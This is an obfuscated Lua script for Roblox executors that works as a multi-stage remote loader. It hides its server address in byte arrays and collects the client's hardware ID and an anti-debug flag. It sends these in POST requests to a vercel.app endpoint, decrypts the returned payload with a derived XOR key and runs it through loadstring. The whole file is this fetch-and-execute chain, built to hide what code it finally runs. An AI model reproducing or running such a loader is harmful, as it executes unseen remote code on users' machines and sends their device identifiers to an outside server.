local function _jGCmq(t) local s="" for i=1,#t do s=s..string.char(t[i]) end return s end
local _BovF=_jGCmq({118,114,99,101,108,50,45,104,97,122,101,108,46,118,101,114,99,101,108,46,97,112,112})
local _oVbA=_jGCmq({47,97,112,105,47,103,47})
local _MDplh=_jGCmq({67,111,110,116,101,110,116,45,84,121,112,101})
local _XJUCd=_jGCmq({97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110})
local _BEWT={{94,55,46,70,106,116,75},{59,57,44,56,91,120,46},{83,84,102,118,41,91,76},{67,62,66,33,94,40,114},{105,99,41,38}}
local _LTI={3,1,4,2,5}
local _NGCix=""
for i=1,#_LTI do _NGCix=_NGCix.._jGCmq(_BEWT[_LTI[i]]) end
local function _RRYll(s,seed) local h=seed%4294967296 for i=1,#s do h=bit32.bxor(h,string.byte(s,i)) h=bit32.lrotate(h,7) h=bit32.band(h*15+335157,4294967295) end return h end
local _Kbp="0123456789abcdef"
local function _HSE(x) local s="" for i=1,8 do s=string.sub(_Kbp,bit32.band(x,15)+1,bit32.band(x,15)+1)..s x=bit32.rshift(x,4) end return s end
local function _aZRF(s,a,b) return _HSE(_RRYll(s,a)).._HSE(_RRYll(s,b)) end
local _Plzz="unknown"
pcall(function() _Plzz=game:GetService("RbxAnalyticsService"):GetClientId() end)
local _jSy=os.time()
local _Egtpk=0
pcall(function() if debug and debug.gethook and debug.gethook() then _Egtpk=1 end end)
local function _gziZ(ts) local days=math.floor(ts/86400) local z=days+719468 local era=math.floor(z/146097) local doe=z-era*146097 local yoe=math.floor((doe-math.floor(doe/1460)+math.floor(doe/36524)-math.floor(doe/146096))/365) local y=yoe+era*400 local doy=doe-(365*yoe+math.floor(yoe/4)-math.floor(yoe/100)) local mp=math.floor((5*doy+2)/153) local d=doy-math.floor((153*mp+2)/5)+1 local m=mp+(mp<10 and 3 or -9) if m<=2 then y=y+1 end return string.format("%04d%02d%02d",y,m,d) end
local _Kvlpb=_gziZ(_jSy)
local _Byk=request or http_request or (syn and syn.request) or (http and http.request)
if not _Byk then print("[L3] e1:no-request") return end
local _PYUn=game:GetService("HttpService")
local function _aABh(u,t) return _Byk({Url=u,Method="POST",Headers={[_MDplh]=_XJUCd},Body=_PYUn:JSONEncode(t)}) end
local _Nbe=_aZRF(_NGCix.."|s2|".._Kvlpb.."|".._Plzz,2654435769,2246822519)
local _fGmxB,_dkTEn=pcall(_aABh,"https://".._BovF.._oVbA.._Nbe,{hwid=_Plzz,ts=_jSy,fp=_Egtpk})
if not _fGmxB or not _dkTEn or not _dkTEn.Body then print("[L3] e2:stage2-noreply") return end
local _dDWSz;_fGmxB,_dDWSz=pcall(function() return _PYUn:JSONDecode(_dkTEn.Body) end)
if not _fGmxB or type(_dDWSz)~="table" or not _dDWSz.t or not _dDWSz.k then print("[L3] e3:stage2-badjson (server kirim sampah)") return end
local function _XMa(sec,hwid,ts) local m=sec.."|dk|"..hwid.."|"..ts local o={} for i=0,31 do o[i+1]=bit32.band(_RRYll(m.."|"..i,305419896+i*7919),255) end return o end
local _QMOz="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local _lZArC={} for i=1,64 do _lZArC[string.byte(_QMOz,i)]=i-1 end
local function _PDfbx(s) s=string.gsub(s,"[^".._QMOz.."=]","") local o={} for c1,c2,c3,c4 in string.gmatch(s,"(.)(.)(.)(.)") do local v1=_lZArC[string.byte(c1)] or 0 local v2=_lZArC[string.byte(c2)] or 0 local v3=(c3~="=") and (_lZArC[string.byte(c3)] or 0) or -1 local v4=(c4~="=") and (_lZArC[string.byte(c4)] or 0) or -1 o[#o+1]=bit32.band(bit32.bor(bit32.lshift(v1,2),bit32.rshift(v2,4)),255) if v3>=0 then o[#o+1]=bit32.band(bit32.bor(bit32.lshift(bit32.band(v2,15),4),bit32.rshift(v3,2)),255) end if v4>=0 then o[#o+1]=bit32.band(bit32.bor(bit32.lshift(bit32.band(v3,3),6),v4),255) end end return o end
local _eLsg=_PDfbx(_dDWSz.k)
local _uLqO=_XMa(_NGCix,_Plzz,_jSy)
local _ineNY={} for i=1,32 do _ineNY[i]=bit32.bxor(_eLsg[i] or 0,_uLqO[i] or 0) end
local _fIdx=_aZRF(_NGCix.."|s3|".._dDWSz.t,bit32.bxor(2654435769,1515870810),bit32.bxor(2246822519,1010580540))
_fGmxB,_dkTEn=pcall(_aABh,"https://".._BovF.._oVbA.._fIdx,{t=_dDWSz.t,hwid=_Plzz})
if not _fGmxB or not _dkTEn or not _dkTEn.Body then print("[L3] e4:stage3-noreply") return end
_fGmxB,_dDWSz=pcall(function() return _PYUn:JSONDecode(_dkTEn.Body) end)
if not _fGmxB or type(_dDWSz)~="table" or not _dDWSz.d or not _dDWSz.c then print("[L3] e5:stage3-badjson") return end
local _kclrK=_PDfbx(_dDWSz.d)
local _IDuc={} for i=1,#_kclrK do _IDuc[i]=string.char(bit32.bxor(_kclrK[i],_ineNY[((i-1)%32)+1])) end
local _FoF=table.concat(_IDuc)
if _RRYll(_FoF,2882400001)~=_dDWSz.c then print("[L3] e6:checksum-gagal") return end
local _qraX=loadstring(_FoF)
if _qraX then pcall(_qraX) end
